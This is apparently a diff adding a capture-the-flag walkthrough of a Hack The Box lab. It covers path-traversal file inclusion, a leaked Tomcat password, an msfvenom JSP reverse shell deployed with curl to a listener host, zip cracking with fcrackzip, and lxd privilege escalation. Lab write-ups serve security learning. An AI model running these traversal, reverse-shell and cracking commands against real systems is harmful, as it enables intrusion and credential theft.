@@ -1,0 +1,35 @@
+Local File Inclusion spotted:
+http://megahosting.htb/news.php?file=statement
+http://10.10.10.194/news.php?file=../../../../../etc/passwd
+
+10.10.10.194:8080 shows the path for tomcat users list
+
+http://10.10.10.194/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+Can use this cred to log in to admin-gui and manager-script
+
+Create reverse shell payload:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.22 LPORT=6969 -f war > pl.war
+
+Upload payload:
+curl -u 'tomcat':'$3cureP4s5w0rd123!' -T pl.war 'http://10.10.10.194:8080/manager/text/deploy?path=/runthis'
+
+Set up nc listener: nc -lvnp 6969
+
+Run payload:
+curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/runthis/
+
+Grab zip file from /var/www/html/files/
+
+brute force zip password:
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+
+password is for user ash -> got user.txt
+
+id output shows ash belongs to the group lxd
+
+lxd is a Linux container system that is known to have a prives vulnerability.
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+
+^ article about the lxd prives vulnerability -> root.txt owned.
